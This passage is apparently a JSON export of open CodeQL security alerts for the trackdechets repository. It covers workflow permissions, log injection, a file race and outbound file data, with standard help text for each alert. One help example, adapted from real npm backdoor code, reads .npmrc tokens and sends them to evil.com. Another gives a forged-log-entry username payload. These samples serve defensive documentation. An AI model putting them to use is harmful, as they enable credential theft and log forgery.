read}}"},"location":{"path":".github/workflows/deploy-recette.yml","start_line":13,"end_line":39,"start_column":5,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/165/instances","dismissal_approved_by":null},{"number":164,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/164","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/164","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/build-and-test.yml","start_line":7,"end_line":52,"start_column":5,"end_column":52},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/164/instances","dismissal_approved_by":null},{"number":163,"created_at":"2025-02-07T15:04:29Z","updated_at":"2025-02-09T11:39:29Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/163","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/163","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/log-injection","severity":"error","description":"Log injection","name":"js/log-injection","tags":["external/cwe/cwe-117","security"],"full_description":"Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.","help":"# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Log entry depends on a user-provided value."},"location":{"path":"back/src/common/middlewares/loggingMiddleware.ts","start_line":118,"end_line":118,"start_column":15,"end_column":22},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/163/instances","dismissal_approved_by":null},{"number":162,"created_at":"2025-02-07T15:04:29Z","updated_at":"2025-02-09T11:39:29Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/162","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/162","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/log-injection","severity":"error","description":"Log injection","name":"js/log-injection","tags":["external/cwe/cwe-117","security"],"full_description":"Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.","help":"# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Log entry depends on a user-provided value."},"location":{"path":"back/src/common/middlewares/loggingMiddleware.ts","start_line":115,"end_line":115,"start_column":25,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/162/instances","dismissal_approved_by":null},{"number":159,"created_at":"2024-10-14T12:27:13Z","updated_at":"2024-10-14T12:27:15Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/159","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/159","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-system-race","severity":"warning","description":"Potential file system race condition","name":"js/file-system-race","tags":["external/cwe/cwe-367","security"],"full_description":"Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.","help":"# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"The file may have changed since it was checked."},"location":{"path":"libs/back/scripts/src/generate.ts","start_line":39,"end_line":39,"start_column":3,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/159/instances","dismissal_approved_by":null},{"number":158,"created_at":"2024-10-14T12:27:13Z","updated_at":"2024-10-14T12:27:15Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/158","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/158","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-access-to-http","severity":"warning","description":"File data in outbound network request","name":"js/file-access-to-http","tags":["external/cwe/cwe-200","security"],"full_description":"Directly sending file data in an outbound network request can indicate unauthorized information disclosure.","help":"# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Outbound network request depends on file data.\nOutbound network request depends on file data."},"location":{"path":"back/src/common/post/backends/mysendingbox/index.ts","start_line":15,"end_line":15,"start_column":7,"end_column":13},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/158/instances","dismissal_approved_by":null}]}]}